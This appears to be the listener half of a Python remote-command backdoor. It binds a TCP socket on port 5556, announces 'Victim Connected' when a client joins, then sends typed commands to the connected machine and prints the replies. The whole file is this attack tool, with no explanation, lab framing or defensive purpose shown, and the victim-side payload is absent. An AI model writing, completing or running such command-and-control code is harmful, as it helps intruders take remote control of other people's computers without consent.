import socket

host = socket.gethostbyname(socket.gethostname())
port = 5556

buffresize = 1024
socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

socket.bind((host,port))
socket.listen(7)

cl_socket  ,cl_addr = socket.accept()

print("Victim Connected")

def empty():
    print("")

while True:
    empty()
    cmd = input(">>")
    empty()

    cl_socket.send(cmd.encode())

    if cmd.lower() == "exit":
        break

    result = cl_socket.recv(buffresize).decode()
    print(result)

cl_socket.close()
